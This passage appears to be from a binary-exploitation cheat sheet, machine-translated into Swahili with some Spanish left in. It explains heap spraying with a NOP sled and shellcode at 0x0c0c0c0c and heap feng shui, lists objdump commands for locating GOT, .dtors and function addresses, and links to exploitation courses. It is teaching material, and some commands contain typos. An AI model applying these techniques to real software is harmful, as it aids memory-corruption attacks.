Kimsingi inajumuisha kuhifadhi kumbukumbu yote inayowezekana kwa heaps na kujaza hizi na mto wa nops unaomalizika na shellcode. Zaidi ya hayo, kama mto inatumika 0x0c. Kwa hivyo itajaribu kuruka kwenye anwani 0x0c0c0c0c, na hivyo ikiwa anwani yoyote itakayokuwa ikitumiwa inasababisha mto huu itaruka huko. Kimsingi mbinu ni kuhifadhi kadri iwezekanavyo ili kuona ikiwa kuna pointer yoyote inayosababisha na kuruka kwenye 0x0c0c0c0c tukitarajia kuwa huko kuna nops.

**Heap Feng Shui**

Inajumuisha kupitia uhifadhi na kuondoa kuunda kumbukumbu ili kuwe na vipande vilivyohifadhiwa katikati ya vipande vya bure. Buffer inayoweza kujaa itakuwa katika moja ya mayai.

**objdump -d ejecutable** —> Disas functions\
**objdump -d ./PROGRAMA | grep FUNCION** —> Get function address\
**objdump -d -Mintel ./shellcodeout** —> Ili kuona kwamba kwa kweli ni shellcode yetu na kutoa OpCodes\
**objdump -t ./exec | grep varBss** —> Jedwali la alama, ili kupata anwani za variables na functions\
**objdump -TR ./exec | grep exit(func lib)** —> Ili kupata anwani za kazi za maktaba (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** —> Inatoa anwani ya puts ya kuandika katika GOT\
**objdump -D ./exec** —> Disas ALL hadi kwenye ingizo za plt\
**objdump -p -/exec**\
**Info functions strncmp —>** Info ya kazi katika gdb

## Interesting courses

- [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
- [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
- [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **References**

- [**https://guyinatuxedo.github.io/7.2-mitigation_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation_relro/index.html)

{{#include ../../banners/hacktricks-training.md}}
